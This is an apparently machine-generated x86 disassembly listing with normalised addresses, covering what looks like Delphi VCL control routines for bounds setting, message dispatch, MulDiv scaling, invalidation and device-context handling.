call sub_43cd98
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_43cd98
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax ebx
call sub_43cd98
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_43cd98
sub_43b09c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_41970c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x7c ]
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp edi eax
jne r-xdata
xor edx edx
mov eax esi
call sub_43bb84
jmp r-xdata
xor edx edx
mov eax esi
call sub_43af40
sub_43b0e0
push ebx
push esi
push edi
push ecx
mov ebx edx
mov edi eax
mov al [ edi + 0x5b ]
cmp bl al
je r-xdata
mov eax edi
mov si 0xffd0
call sub_403420
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] al
mov [ edi + 0x5b ] bl
xor eax eax
mov al bl
mov dl [ eax + rw-data ]
mov eax edi
call sub_43af20
test [ edi + 0x1c ] 0x1
jne r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
cmp bl 0x6
je r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
cmp [ esp ] 0x6
je r-xdata
mov al [ esp ]
dec eax
sub al 0x2
setb al
mov edx ebx
add dl 0xfd
sub dl 0x2
setb dl
cmp al dl
jne r-xdata
mov eax edi
mov si 0xffee
call sub_403420
mov al [ esp ]
test al al
je r-xdata
sub al 0x5
je r-xdata
test bl bl
je r-xdata
sub bl 0x5
je r-xdata
mov eax [ edi + 0x4c ]
push eax
mov eax [ edi + 0x48 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx [ edi + 0x40 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_43b188
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea ecx [ ebp + 0x8 ]
lea edx [ ebp + 0xc ]
mov eax ebx
call sub_43d328
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp esi [ ebx + 0x40 ]
jne r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_43c014
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_43b220
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
push 0x0
xor ecx ecx
mov edx 0x47
mov eax ebx
call sub_43cd98
mov eax ebx
mov si 0xffd0
call sub_403420
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov eax ebx
mov si 0xffcf
call sub_403420
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
sub_43b220
push ebx
push esi
add esp 0xfffffff0
mov esi eax
cmp [ esi + 0x62 ] 0x0
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
jne r-xdata
mov bl [ esi + 0x61 ]
mov al [ r-xdata ]
cmp al bl
jne r-xdata
test bl 0x4
je r-xdata
xor eax eax
mov [ esi + 0x90 ] eax
xor eax eax
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
sar eax 0x1
jns r-xdata
test bl 0x1
je r-xdata
add eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
adc eax 0x0
mov eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
sar eax 0x1
jns r-xdata
test bl 0x2
je r-xdata
test bl 0x8
je r-xdata
add eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
adc eax 0x0
mov eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
mov [ esi + 0x8c ] eax
jmp r-xdata
test [ ebx + 0x1c ] 0x2
je r-xdata
mov ebx [ esi + 0x30 ]
test ebx ebx
je r-xdata
mov eax ebx
call sub_4426d0
test al al
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x48 ]
mov [ esi + 0x90 ] eax
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x4c ]
mov [ esi + 0x94 ] eax
mov edx esp
mov eax [ esi + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ esi + 0x90 ] eax
mov eax [ esp + 0xc ]
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ ebx + 0x1fa ]
mov [ esi + 0x90 ] eax
mov eax [ ebx + 0x1fe ]
mov [ esi + 0x94 ] eax
jmp r-xdata
sub_43b33c
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x1
pop esi
pop ebx
retn
sub_43b360
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx edx
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x2
pop esi
pop ebx
retn
sub_43b388
push ebx
push esi
mov esi eax
push edx
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x4
pop esi
pop ebx
retn
sub_43b3ac
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
push edx
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x8
pop esi
pop ebx
retn
sub_43b3d0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0xa0 ]
je r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x400
xor edx edx
push ebp
push sub_43b4cb
push [ fs : edx ]
mov [ fs : edx ] esp
cmp ebx 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
cmp ebx eax
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffe4
call sub_403420
test ebx ebx
je r-xdata
cmp [ eax + 0x178 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b4d2
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfbff
retn
mov edi eax
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xffffffff
je r-xdata
mov eax [ eax + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_413a5c
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
cmp [ ebx + 0x178 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffbf
call sub_403420
test edi edi
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc5
call sub_403420
jmp r-xdata
mov eax [ ebx + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_4137bc
sub_43b4dc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033b0
test al al
jne r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_43c014
mov edx edi
mov eax ebx
call sub_43b58c
mov edx edi
mov eax ebx
call sub_43ce3c
jmp r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
cmp esi 0xffffffff
jne r-xdata
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_43b548
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea eax [ ebx + 0x154 ]
mov edx esi
call sub_403fb0
pop esi
pop ebx
retn
mov [ ebx + 0x150 ] 0x0
sub_43b58c
push ebx
push esi
push edi
push ebp
mov esi eax
mov eax [ edx + 0x8 ]
mov edi [ edx ]
sub eax edi
push eax
mov eax [ edx + 0xc ]
mov ebp [ edx + 0x4 ]
sub eax ebp
push eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
pop ebp
pop edi
pop esi
pop ebx
retn
sub_43b5e8
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_43b614
mov edx eax
mov ecx esp
mov eax esi
call sub_4124bc
mov edx esp
mov eax ebx
call sub_43ba58
pop ecx
pop edx
pop esi
pop ebx
retn
sub_43b62c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_43b5d0
mov ecx esp
mov edx esi
call sub_4124bc
mov edx esp
mov eax ebx
call sub_43ba58
pop ecx
pop edx
pop esi
pop ebx
retn
sub_43b654
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43b6d5
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebx + 0x40 ]
add [ esi ] eax
mov eax [ ebx + 0x44 ]
add [ esi + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b6dc
lea eax [ ebp - 0xc ]
call sub_403f5c
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b42c
call sub_403998
sub_43b6e4
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
add eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
add eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_43b710
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
sub eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_43b73c
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
mov edx esi
mov eax ebx
call sub_456a58
sub_43b76c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebx + 0xa0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ rw-data ] 0x0
jne r-xdata
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov [ ebp - 0x10 ] edi
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx 0xb042
mov eax esi
call sub_43cd98
sub_43b7e8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov edi edx
mov esi eax
cmp edi [ esp ]
je r-xdata
mov al [ r-xdata ]
mov [ esi + 0x98 ] al
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
je r-xdata
mov bl [ r-xdata ]
mov bl [ esi + 0x98 ]
jmp r-xdata
mov ebp [ esi + 0x40 ]
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
push eax
call MulDiv
mov ebp eax
jmp r-xdata
test bl 0x1
je r-xdata
mov eax [ esi + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0x4 ] eax
jmp r-xdata
test bl 0x2
je r-xdata
mov eax [ esi + 0x48 ]
mov [ esp + 0x8 ] eax
test [ esi + 0x51 ] 0x1
jne r-xdata
test bl 0x4
je r-xdata
mov eax [ esi + 0x4c ]
mov [ esp + 0xc ] eax
test [ esi + 0x51 ] 0x2
jne r-xdata
test bl 0x1
je r-xdata
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x90 ]
push eax
call MulDiv
mov [ esi + 0x90 ] eax
test bl 0x8
setne dl
test al al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x48 ]
push eax
call MulDiv
mov [ esp + 0x8 ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
add eax [ esi + 0x48 ]
push eax
call MulDiv
sub eax ebp
mov [ esp + 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x59 ] 0x0
jne r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x94 ]
push eax
call MulDiv
mov [ esi + 0x94 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0xc ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
add eax [ esi + 0x4c ]
push eax
call MulDiv
sub eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
test bl 0x8
setne al
test al al
je r-xdata
test bl 0x10
je r-xdata
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov ecx [ esp + 0xc ]
mov edx ebp
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov ebx [ esi + 0x68 ]
mov eax ebx
call sub_41c748
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_41c764
sub_43b9b4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_43ba4a
push [ fs : eax ]
mov [ fs : eax ] esp
test [ edi + 0x50 ] 0x20
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_419948
test bl bl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_43bbcc
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x8 ]
call sub_404368
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ba51
lea eax [ ebp - 0x8 ]
call sub_403f5c
retn
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_43bbfc
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov bl 0x1
mov eax esi
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
test [ esi + 0x1c ] 0x1
je r-xdata
sub_43ba58
push ebx
push esi
push edi
add esp 0xffffffe8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x48 ]
sub eax [ esp + 0x10 ]
add eax [ esp ]
push eax
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x18 ]
add eax [ esp + 0x8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_43baa0
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
jne r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4ac
call sub_403998
test esi esi
je r-xdata
mov edx ebx
call sub_43f044
mov edx ebx
mov eax esi
call sub_43ef70
mov eax ebx
call sub_43b220
sub_43baec
push ebx
push esi
push edi
mov ebx edx
mov edi eax
cmp bl [ edi + 0x57 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov si 0xffcd
call sub_403420
mov [ edi + 0x57 ] bl
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb00b
mov eax edi
call sub_43cd98
mov eax edi
mov si 0xffd0
call sub_403420
sub_43bb84
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x7c ] esi
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_44f98c
mov edx ebx
mov eax esi
call sub_4194c0
sub_43bba8
push ebx
mov ebx eax
push edx
xor ecx ecx
mov eax ebx
mov edx 0xc
call sub_43cd98
push 0x0
xor ecx ecx
mov edx 0xb012
mov eax ebx
call sub_43cd98
pop ebx
retn
sub_43bbcc
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_43bb40
mov ebx eax
mov eax edi
mov ecx ebx
xor edx edx
call sub_40404c
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
lea ecx [ ebx + 0x1 ]
mov edx [ edi ]
mov eax esi
call sub_43bb50
sub_43bbfc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43bc51
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43bbcc
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_404368
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43bc58
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
mov eax esi
call sub_40441c
mov edx eax
mov eax ebx
call sub_43bba8
sub_43bc7c
push ebx
mov ebx eax
mov [ ebx + 0x59 ] 0x0
mov [ ebx + 0x56 ] 0x0
mov eax [ ebx + 0x68 ]
call sub_41c6a4
cmp eax [ ebx + 0x84 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb00e
mov eax ebx
call sub_43cd98
pop ebx
retn
or [ ebx + 0x98 ] 0x10
mov eax [ ebx + 0x68 ]
call sub_41c6a4
mov [ ebx + 0x84 ] eax
sub_43be04
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_43bdf4
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor eax eax
call sub_438d9c
mov eax esi
call sub_438d9c
jmp r-xdata
sub_43be3c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x198 ]
mov edx ebx
call sub_413974
test eax eax
jl r-xdata
mov edx [ ebx + 0x30 ]
mov edi [ edx + 0x198 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_413808
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x198 ]
mov ecx ebx
mov edx esi
call sub_413994
mov cl 0x1
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_43c014
mov eax ebx
call sub_4529a8
test [ eax + 0x54 ] 0x4
je r-xdata
mov dl 0x1
mov si 0xffd1
call sub_403420
sub_43bebc
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
retn
test dl dl
je r-xdata
xor edx edx
call sub_43be3c
mov edx [ ecx + 0x198 ]
mov edx [ edx + 0x8 ]
dec edx
call sub_43be3c
jmp r-xdata
sub_43bee0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_43bf76
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
push 0x0
mov eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x40 ]
push eax
push esi
call SetViewportOrgEx
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43bf7d
lea eax [ ebp - 0xc ]
call sub_403f5c
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b42c
call sub_403998
sub_43bf88
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edi [ eax + 0x198 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax edi
call sub_413974
mov esi eax
test esi esi
jle r-xdata
mov [ ebp - 0x1 ] 0x0
dec esi
mov edx esi
mov eax edi
call sub_413918
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test esi esi
jg r-xdata
test [ ebx + 0x50 ] 0x40
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_43b56c
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call IntersectRect
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call EqualRect
test eax eax
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43c014
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x15 ] cl
mov ebx edx
mov [ ebp - 0x4 ] eax
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4426d0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_43b56c
cmp [ ebp - 0x15 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test [ eax + 0x50 ] 0x40
jne r-xdata
neg al
sbb eax eax
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4423cc
push eax
call InvalidateRect
push ebp
call sub_43bf88
pop ecx
test al al
je r-xdata
mov al 0x1
sub_43c0b0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_452980
mov esi eax
test esi esi
je r-xdata
mov eax [ edi + 0x8 ]
push eax
mov ecx [ edi + 0x4 ]
mov edx 0xb043
mov eax ebx
call sub_43cd98
mov [ edi + 0xc ] eax
cmp ebx esi
je r-xdata
mov edx edi
mov eax esi
mov si 0xffc9
call sub_403420
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43c114
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4426d0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x40
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4423cc
push eax
call GetDC
mov [ ebp - 0x8 ] eax
xor ecx ecx
push ebp
push sub_43c1ed
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x44 ]
mov ecx edx
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x4c ]
push ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov ecx eax
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x48 ]
push ecx
push edx
push eax
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_4401d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4423cc
push eax
call ReleaseDC
retn
sub_43c28c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx edx
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
mov eax edi
call sub_43cdcc
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi + 0x9b ] 0x1
je r-xdata
xor eax eax
mov [ rw-data ] eax
test [ edi + 0x54 ] 0x1
je r-xdata
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4ac
call sub_403998
test esi esi
jge r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_43b710
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_40688c
push eax
xor ecx ecx
mov edx 0x202
mov eax edi
call sub_43cd98
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x8 ]
mov ecx esi
mov edx ebx
mov eax edi
call sub_439f1c
sub_43c360
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] 0x0
cmp [ eax + 0xf2 ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0xc
mov [ esi ] 0x1
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
push esi
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xf4 ]
call [ ebx + 0xf0 ]
sub_43c39c
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xea ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_43c3e8
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x11a ] 0x0
je r-xdata
